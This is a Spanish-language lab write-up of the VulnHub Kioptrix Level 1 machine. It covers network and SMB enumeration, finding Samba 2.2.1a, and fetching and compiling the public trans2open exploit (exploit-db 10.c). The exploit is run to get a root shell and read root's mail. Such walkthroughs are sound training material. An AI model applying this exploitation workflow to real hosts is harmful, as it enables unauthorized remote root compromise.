# Write-up: Kioptrix Level 1 (VulnHub)

**Fecha:** 26 de marzo, 2026  
**Objetivo:** Obtener acceso de superusuario (root) y leer la bandera/correo de felicitación.  
**Dificultad:** Principiante (Boot2Root Clásico)

---

## 1. Reconocimiento y Enumeración de Red

El primer paso fue identificar la dirección IP de la máquina objetivo dentro de la red local.

```bash
$ sudo arp-scan -I wlan0 --localnet
[sudo] password for edibauer: 
Interface: wlan0, type: EN10MB, MAC: 94:e6:f7:ea:2c:4d, IPv4: 192.168.1.17
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1	f8:79:28:89:8b:0a	(Unknown)
192.168.1.2	e0:03:6b:1b:03:57	Samsung Electronics Co.,Ltd
192.168.1.4	6c:48:a6:e9:7a:81	(Unknown)
192.168.1.6	54:b1:21:c9:38:2a	HUAWEI TECHNOLOGIES CO.,LTD
192.168.1.5	38:30:f9:46:4d:09	LG Electronics (Mobile Communications)
192.168.1.9	6e:fc:dc:af:45:09	(Unknown: locally administered)
192.168.1.104	94:e6:f7:ea:2c:4d	Intel Corporate

7 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.171 seconds (117.92 hosts/sec). 7 responded

$ ping -c 1 192.168.1.104
PING 192.168.1.104 (192.168.1.104) 56(84) bytes of data.
64 bytes from 192.168.1.104: icmp_seq=1 ttl=255 time=1.19 ms

--- 192.168.1.104 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1.186/1.186/1.186/0.000 ms


```

---

## 2. Escaneo de Puertos y Servicios

Se realizó un escaneo profundo para determinar qué puertas estaban abiertas y qué versiones de software se estaban ejecutando.

```bash
nmap -p- --oepn -sS --min-rate 5000 -vvv -n -Pn 192.168.1.104 -oG allPorts
nmap -sCV -p22,80,111,139,443,1024 192.168.1.104 -oN targeted
whatweb http://192.168.1.104
nmap --script http-enum -p80 192.168.1.104 -oN webScan
nmap --script smb-os-discovery,smb-enum-services -p139 192.168.1.104 -oN smbScan # new
smbclient -L //192.168.1.104 -N


```

---

## 3. Enumeración Específica de SMB

Dado que el puerto 139 es un vector clásico en máquinas antiguas, se procedió a identificar la versión exacta de **Samba**.

```bash
smbclient -L //192.168.1.104 -N

tshark -i eth0 -Y "smb" -T fields -e smb.native_lanman #new
sudo tcpdump -i eth0 -A port 139 or port 445 #new

# Samba 2.2.1a

```

## 4. Investigación de Vulnerabilidades (Exploit Research)

Con la versión exacta, se buscó un exploit público que permitiera la ejecución remota de comandos (RCE).

* **Herramienta:** `searchsploit`
* **Comando:** `searchsploit samba 2.2.1a`

```bash
$ searchsploit samba 2.2.1a

Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metas | osx/remote/9924.rb
Samba < 2.2.8 (Linux/BSD) - Remote Code Execution      | multiple/remote/10.c
Samba < 3.0.20 - Remote Heap Overflow                  | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)          | linux_x86/dos/36741.py

$ searchsploit -m 10
  Exploit: Samba < 2.2.8 (Linux/BSD) - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/10
     Path: /usr/share/exploitdb/exploits/multiple/remote/10.c
    Codes: OSVDB-4469, CVE-2003-0201
 Verified: True
File Type: C source, ASCII text
Copied to: /home/edibauer/Desktop/m4chines_pwned/Kioptrix/exploits/10.c


```

---

## 5. Compilación y Adaptación del Exploit

El exploit `10.c` es código antiguo que requiere ajustes para compilarse en sistemas modernos de 64 bits.

* **Instalación de dependencias:** `sudo apt install gcc-multilib`
* **Modificaciones en el código (`10.c`):**
    * Se corrigieron los prototipos de funciones `shell()`, `usage()` y `handler()` para evitar conflictos de tipos.
* **Comando de compilación:**
    ```bash
    gcc -m32 10.c -o exploit -lcrypt
    ```
    *(Nota: Se usó `-m32` para arquitectura de 32 bits y `-lcrypt` para la librería de cifrado).*

```bash
sudo apt update && sudo apt install gcc-multilib g++-multilib

```
![alt text](image.png)

```bash
sudo apt install libcrypt-dev:i386
gcc -m32 /home/edibauer/Desktop/m4chines_pwned/Kioptrix/exploits/10.c -o /home/edibauer/Desktop/m4chines_pwned/Kioptrix/exploits/exploit -lcrypt -Wno-format -Wno-implicit-function-declaration -Wno-incompatible-pointer-types

```

---

## 6. Explotación

Se lanzó el binario compilado contra el objetivo para forzar un desbordamiento de búfer en el servicio SMB.

* **Comando:** `./exploit -b 0 [IP_OBJETIVO]`
    * El flag `-b 0` inicia un ataque de fuerza bruta sobre las direcciones de memoria para sistemas Linux.
* **Resultado:** El exploit logró inyectar el shellcode y abrir una conexión remota.
```bash
cat 10.c # to view how it works
./exploit -b 0 -v 192.168.1.104


```

---

## 7. Post-Explotación y Root

Tras ejecutar el exploit, se obtuvo una shell con privilegios máximos.

* **Verificación:**
    * `whoami` -> `root`
    * `id` -> `uid=0(root) gid=0(root)`
* **Estabilización de Shell:** Se intentó usar Python para una TTY interactiva, detectando una versión extremadamente antigua (**Python 1.5**).
* **Objetivo Final:** Lectura del correo de felicitación en la ruta:
    ```bash
    cat /var/spool/mail/root
    ```
```bash
$ python -c 'import pty; pty.spawn("/bin/bash")' # it doesn't work

$ export TERM=xterm
$ bash # it doesn't work

$ /bin/sh -i # it works

$ cat /var/spool/mail/root
From root  Sat Sep 26 11:42:10 2009
Return-Path: <root@kioptix.level1>
Received: (from root@localhost)
	by kioptix.level1 (8.11.6/8.11.6) id n8QFgAZ01831
	for root@kioptix.level1; Sat, 26 Sep 2009 11:42:10 -0400
Date: Sat, 26 Sep 2009 11:42:10 -0400
From: root <root@kioptix.level1>
Message-Id: <200909261542.n8QFgAZ01831@kioptix.level1>
To: root@kioptix.level1
Subject: About Level 2
Status: O

If you are reading this, you got root. Congratulations.
Level 2 won't be as easy...

From root  Fri Mar 27 00:32:08 2026
Return-Path: <root@kioptrix.level1>
Received: (from root@localhost)
	by kioptrix.level1 (8.11.6/8.11.6) id 62R5W8P01116
	for root; Fri, 27 Mar 2026 00:32:08 -0500
Date: Fri, 27 Mar 2026 00:32:08 -0500
From: root <root@kioptrix.level1>
Message-Id: <202603270532.62R5W8P01116@kioptrix.level1>
To: root@kioptrix.level1
Subject: LogWatch for kioptrix.level1



 ################## LogWatch 2.1.1 Begin ##################### 


 ###################### LogWatch End ######################### 

```

---

## Conclusión
La resolución de Kioptrix 1 demuestra que la **enumeración precisa de versiones** es la clave del éxito. A pesar de los errores de compilación por la antigüedad del código, el ajuste manual de los prototipos en C permitió ejecutar un ataque exitoso de desbordamiento de memoria.